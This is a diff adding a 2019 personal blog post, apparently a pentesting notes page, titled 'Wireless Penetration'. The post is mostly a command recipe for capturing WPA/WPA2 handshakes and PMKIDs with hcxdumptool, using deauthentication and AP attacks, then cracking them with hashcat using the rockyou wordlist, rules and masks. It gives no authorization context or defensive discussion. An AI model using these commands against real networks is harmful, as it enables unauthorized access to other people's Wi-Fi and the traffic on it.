@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Wireless Penetration</title>
+  <meta property="og:title" content="Wireless Penetration" />
+  <meta name="twitter:title" content="Wireless Penetration" />
+  <meta name="description" content="The wolves are full and sheep intact">
+  <meta property="og:description" content="The wolves are full and sheep intact">
+  <meta name="twitter:description" content="The wolves are full and sheep intact">
+  <meta name="author" content="GAZ23"/>
+  <link href='https://blackvolga.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://blackvolga.github.io/img/avatar-icon.png" />
+  <meta name="twitter:image" content="https://blackvolga.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://blackvolga.github.io/post/wifi/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="BLVCKƔXLGV" />
+
+  <meta name="generator" content="Hugo 0.58.3" />
+  <link rel="canonical" href="https://blackvolga.github.io/post/wifi/" />
+  <link rel="alternate" href="https://blackvolga.github.io/index.xml" type="application/rss+xml" title="BLVCKƔXLGV">
+
+  
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://blackvolga.github.io/css/main.css" /><link href="https://fonts.googleapis.com/css?family=Ovo" rel="stylesheet"> 
+  <link href="https://fonts.googleapis.com/css?family=Muli" rel="stylesheet">
+  <link rel="stylesheet" href="https://blackvolga.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://blackvolga.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent" href="javascript:void(0)">dispatch</a>
+              <div class="navlinks-children">
+                
+                  <a href="/post/wsl">wsl</a>
+                
+                  <a href="/post/vbox">vbox</a>
+                
+                  <a href="/post/archvfio2019">vfio</a>
+                
+                  <a href="/post/ryzenram">ddr4 oc</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent" href="javascript:void(0)">intel</a>
+              <div class="navlinks-children">
+                
+                  <a href="/intel/101">101</a>
+                
+                  <a href="/intel/tools">tools</a>
+                
+                  <a href="/intel/powershell">powershell</a>
+                
+                  <a href="/intel/cheats">cheatsheets</a>
+                
+              </div>
+            </li>
+          
+        
+          
+            <li class="navlinks-container">
+              <a class="navlinks-parent" href="javascript:void(0)">ref</a>
+              <div class="navlinks-children">
+                
+                  <a href="/ref/links">links</a>
+                
+                  <a href="/ref/list">reading list</a>
+                
+              </div>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="BLVCKƔXLGV" href="https://blackvolga.github.io">
+            <img class="avatar-img" src="https://blackvolga.github.io/img/avatar-icon.png" alt="BLVCKƔXLGV" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>Wireless Penetration</h1>
+              
+              
+                
+                  <h2 class="post-subheading">The wolves are full and sheep intact</h2>
+                
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on October 17, 2019
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (294 words)
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+
+<p>Posted without comment (no pun intended)</p>
+
+<!-- more --> 
+
+<p>Don&rsquo;t try this at home, kids!</p>
+
+<p>Random Musing: this could <em>probably</em> be done on a <a href="https://github.com/mame82/P4wnP1" target="_blank">Pi</a> or similar.</p>
+
+<hr />
+
+<h2 id="inside-jokers-lair">Inside Jokers&rsquo; Lair</h2>
+
+<ul>
+<li><p>Boot <a href="https://www.kali.org/downloads/" target="_blank">Kali Light</a></p></li>
+
+<li><p>As of <strong>2019.03</strong>:</p>
+
+<p>apt-get update &amp;&amp; <br />
+  apt-get -y upgrade &amp;&amp; \<br />
+  apt-get install -y gcc git make \<br />
+                     libcurl4-openssl-dev libssl-dev zlib1g-dev</p>
+
+<p>git clone <a href="https://github.com/ZerBea/hcxdumptool" target="_blank">https://github.com/ZerBea/hcxdumptool</a> &amp;&amp; \<br />
+            cd hcxdumptool &amp;&amp; <br />
+            make install</p>
+
+<p># run for 30 secs to confirm capabilities<br />
+  hcxdumptool -i interface &ndash;do_rcascan</p>
+
+<p># you can add &ndash;filterlist=<file> or &ndash;ap_mac=<mac_addr> if you prefer<br />
+  # default scan list: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12, 13<br />
+  hcxdumptool -i wlp39s0f3u4u5 -o haktheplanet.cap <br />
+              -T 5 -t 90 -D 100 -A 100 <br />
+              &ndash;give_up_ap_attacks=10 <br />
+              &ndash;give_up_deauthentications=10 <br />
+              &ndash;reactive_beacon <br />
+              &ndash;enable_status=3</p>
+
+<p># convert to usable format(s)<br />
+  hcxpcaptool -k haktheplanet.pmkid haktheplanet.cap<br />
+  hcxpcaptool -o haktheplanet.hashcat haktheplanet.cap<br />
+  hcxpcaptool -O haktheplanet.raw.hashcat haktheplanet.cap</p></li>
+</ul>
+
+<hr />
+
+<h2 id="back-at-the-bat-cave">Back At The Bat Cave</h2>
+
+<ul>
+<li>Hashmode: 2500<br />
+<br /></li>
+</ul>
+
+<p>| GPU | kH/s |<br />
+  |&mdash;|&mdash;|<br />
+  | RX5700XT | 474.1 |<br />
+  | GTX1070 | 297.8 |<br />
+  | RX580 | 224.0 |</p>
+
+<ul>
+<li><p>Use <code>-m 16800</code> for PMKIDs or <code>-m 2500</code> regular hashcats</p>
+
+<p>curl -L -o rockyou.txt <a href="https://github.com/brannondorsey/naive-hashcat/releases/" target="_blank">https://github.com/brannondorsey/naive-hashcat/releases/</a>  download/data/rockyou.txt</p>
+
+<p># low hanging fruit, how does this still work lulz<br />
+  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt &ndash;potfile-path   haktheplanet.naive.win</p>
+
+<p># kay time for rules<br />
+  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/d3ad0ne.rule   &ndash;potfile-path haktheplanet.deadone.win</p>
+
+<p># this isnt the slowest<br />
+  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/rockyou-30000.rule   &ndash;potfile-path haktheplanet.rocku.win</p>
+
+<p># dive isnt fast<br />
+  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/dive.rule   &ndash;potfile-path haktheplanet.dive.win</p>
+
+<p># GLHF ¯_(ツ)_/¯<br />
+  hashcat -m 2500 -a 3 haktheplanet.hashcat ./masks/rockyou-1-60.hcmask &ndash;potfile-path   haktheplanet.mask.win</p></li>
+</ul>
+
+<hr />
+
+<h2 id="reference">Reference</h2>
+
+<ul>
+<li><a href="https://github.com/ZerBea/hcxtools" target="_blank">101</a><br /></li>
+<li><a href="https://hashcat.net/forum/thread-7717.html" target="_blank">PMKID</a> (2010)<br /></li>
+<li><a href="https://foxglovesecurity.com/2016/02/24/when-whales-fly-building-a-wireless-pentest-environment-using-docker/" target="_blank">Docker All The Things!</a><br /></li>
+<li><a href="https://papers.mathyvanhoef.com/ccs2017.pdf" target="_blank">WPA2 Dead Yo</a><br /></li>
+<li><a href="https://medium.com/@adam.toscher/configure-your-new-wireless-ac-1fb65c6ada57" target="_blank">AC Config</a><br /></li>
+<li><a href="https://github.com/0x90/wifi-arsenal" target="_blank">Everything Else</a><br />
+<br /></li>
+</ul>
+
+<hr />
+
+<h3 id="notable-mentions">Notable Mentions</h3>
+
+<ul>
+<li><a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux" target="_blank">https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux</a><br /></li>
+<li><a href="https://www.willhackforsushi.com/?page_id=50" target="_blank">https://www.willhackforsushi.com/?page_id=50</a><br /></li>
+<li><a href="https://github.com/edthamm/lootbooty" target="_blank">https://github.com/edthamm/lootbooty</a><br /></li>
+<li><a href="https://github.com/InfamousSYN/rogue" target="_blank">https://github.com/InfamousSYN/rogue</a><br /></li>
+<li>pyrit, tshark, cowpatty, aircrack-ng: <a href="https://github.com/derv82/wifite2" target="_blank">https://github.com/derv82/wifite2</a><br /></li>
+<li><a href="https://twitter.com/wishbone1138" target="_blank">Josh Hoover</a> n <a href="https://www.defcon.org/images/defcon-21/dc-21-presentations/djwishbone-PuNk1nPo0p/DEFCON-21-djwishbone-PuNk1nPo0p-BYO-Disaster-Updated.pdf" target="_blank">PunK1nPO0P</a> DEFCON21: <a href="https://www.youtube.com/watch?v=-uqTqJwTFyU&amp;feature=youtu.be&amp;t=22m34s" target="_blank">Why Corporate Wireless Security Still Sucks</a><br /></li>
+</ul>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://blackvolga.github.io/tags/wifi/">wifi</a>&nbsp;
+            
+              <a href="https://blackvolga.github.io/tags/hcx/">hcx</a>&nbsp;
+            
+              <a href="https://blackvolga.github.io/tags/hashcat/">hashcat</a>&nbsp;
+            
+          </div>
+        
+
+        
+      </article>
+
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/blackvolga" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="mailto:blackvolga@pm.me" title="Mail me">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://explorer.bitcoin.com/bch/address/bitcoincash:qqyc9j2nxuvjvt27487q4u4xclac2nmmvqasrqmhhm" title="Bitcoin Cash">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-bitcoin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+        </ul>
+        <p class="credits theme-by text-muted">
+           <a href="http://gohugo.io">Hugo v0.58.3</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://blackvolga.github.io/js/main.js"></script>
+<script src="https://blackvolga.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://blackvolga.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+  </body>
+</html>
+
